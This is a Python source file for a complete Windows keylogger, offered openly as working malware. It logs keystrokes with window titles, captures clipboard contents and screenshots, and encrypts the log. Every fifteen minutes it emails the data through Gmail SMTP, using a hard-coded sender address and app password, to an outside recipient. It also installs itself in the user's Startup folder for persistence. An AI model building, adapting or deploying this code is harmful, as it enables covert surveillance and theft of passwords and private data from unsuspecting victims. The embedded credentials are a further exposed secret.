import os
import smtplib
import ssl
import pyperclip
import pyautogui
import schedule
import threading
import time
import win32gui
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime

# CONFIGURATION
EMAIL = "aderinsolabamidele1@gmail.com"
PASSWORD = "txea pukv wpgy gxjp"
TO_EMAIL = "anonymoustrain234@gmail.com"

LOG_FILE = "keystroke_log.txt"
ENCRYPTED_FILE = "keystroke_log.encrypted"
SCREENSHOT_FILE = "screenshot.png"

# KEY MANAGEMENT 
if not os.path.exists("key.key"):
    with open("key.key", "wb") as key_file:
        key_file.write(Fernet.generate_key())

with open("key.key", "rb") as key_file:
    key = key_file.read()

fernet = Fernet(key)
key_log = []

def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown Window"

def on_press(key):
    try:
        current_window = get_active_window()
        key = str(key).replace("'", "")

        if key == "Key.space":
            key = " "
        elif key == "Key.enter":
            key = "\n"
        elif "Key" in key:
            key = f"[{key}]"

        entry = f"{datetime.now()} | {current_window} | {key}\n"
        key_log.append(entry)
    except Exception as e:
        print(f"Error: {e}")

def check_clipboard():
    try:
        content = pyperclip.paste()
        key_log.append(f"{datetime.now()} | Clipboard Copied: {content}\n")
    except:
        pass

def capture_screenshot():
    pyautogui.screenshot(SCREENSHOT_FILE)

def save_and_encrypt():
    if not key_log:
        return

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.writelines(key_log)

    with open(LOG_FILE, "rb") as f:
        encrypted = fernet.encrypt(f.read())

    with open(ENCRYPTED_FILE, "wb") as f:
        f.write(encrypted)

    key_log.clear()
    os.remove(LOG_FILE)

def send_email():
    save_and_encrypt()
    capture_screenshot()

    try:
        msg = f"Subject: Keylogger Report\n\nLog and Screenshot Attached."

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(EMAIL, PASSWORD)

            with open(ENCRYPTED_FILE, "rb") as f:
                server.sendmail(EMAIL, TO_EMAIL, msg.encode("utf-8") + f.read())

            with open(SCREENSHOT_FILE, "rb") as s:
                server.sendmail(EMAIL, TO_EMAIL, s.read())

        print("Email sent.")
    except Exception as e:
        print(f"Failed to send email: {e}")

def add_to_startup():
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    script_path = os.path.realpath(__file__)
    bat_path = os.path.join(startup_folder, "keylogger.bat")

    with open(bat_path, "w") as bat:
        bat.write(f'start "" python "{script_path}"')

def run_schedule():
    while True:
        schedule.run_pending()
        time.sleep(1)

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        schedule_thread = threading.Thread(target=run_schedule)
        schedule_thread.daemon = True
        schedule_thread.start()
        listener.join()

# === SCHEDULING ===
schedule.every(5).minutes.do(check_clipboard)
schedule.every(15).minutes.do(send_email)

# === START ===
add_to_startup()
start_keylogger()
